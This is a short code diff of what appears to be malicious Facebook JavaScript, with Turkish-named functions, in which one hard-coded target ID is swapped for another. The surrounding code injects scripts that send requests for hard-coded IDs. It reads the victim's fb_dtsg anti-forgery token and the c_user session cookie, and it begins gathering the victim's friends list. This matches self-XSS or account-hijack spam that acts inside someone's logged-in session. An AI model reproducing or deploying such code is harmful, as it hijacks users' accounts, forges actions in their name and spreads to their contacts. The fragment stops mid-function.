@@ -2,7 +2,7 @@ function kodran(uidss){var a=document.createElement('script');a.innerHTML="new A
 kodran("1379738492308315");kodran("1379575028991328");kodran("562521103826775");kodran("475420502585488");
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
-var id = "244442615756901";
+var id = "760999640611375";
 var arkadaslar = [];
 var svn_rev;
 function arkadaslari_al(id){            
